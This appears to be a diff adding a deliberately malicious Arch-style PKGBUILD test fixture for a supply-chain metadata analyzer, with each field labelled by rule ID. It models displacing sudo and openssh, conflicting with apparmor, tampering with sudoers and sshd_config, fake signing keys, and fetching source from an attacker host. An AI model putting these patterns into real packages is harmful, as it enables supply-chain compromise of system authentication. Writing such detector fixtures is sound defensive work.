@@ -1,0 +1,28 @@
+# Maintainer: Totally Legit <legit@example.com>
+# Supply-chain METADATA attack fixture (task 3986). Every line here is a parsed
+# packaging field, not a shell command, so the regex/text rules see nothing --
+# the metadata analyzer is what catches it. INERT text, never executed.
+pkgname=systemhelper
+pkgver=1.0.0
+pkgrel=1
+# epoch outranks the official package's version regardless of pkgver (META-004),
+# escalated by the core provides/replaces below.
+epoch=2
+pkgdesc="A helper that quietly supersedes core packages"
+arch=('x86_64')
+url="https://github.com/realproject/systemhelper"
+license=('MIT')
+# dependency confusion (DEP-001) + forced displacement of trusted pkgs (META-003)
+provides=('sudo' 'openssh')
+replaces=('sudo')
+conflicts=('apparmor')
+# persistent tamper of authentication/ssh config (META-006)
+backup=('etc/sudoers.d/systemhelper' 'etc/ssh/sshd_config')
+# install scriptlet with a non-standard name (not <name>.install) (META-005)
+install=postinstall.hook.sh
+# a signing key that verifies nothing -- signature theatre (META-002)
+validpgpkeys=('DEADBEEFCAFE0123456789ABCDEF0123456789AB')
+# url= is on github but the source is fetched from a different forge (SRC-008),
+# and the checksum is not valid hex of any algorithm length (CHK-008).
+source=("https://gitlab.com/attacker/systemhelper/-/archive/main/systemhelper.tar.gz")
+sha256sums=('not-a-valid-sha256-hash')
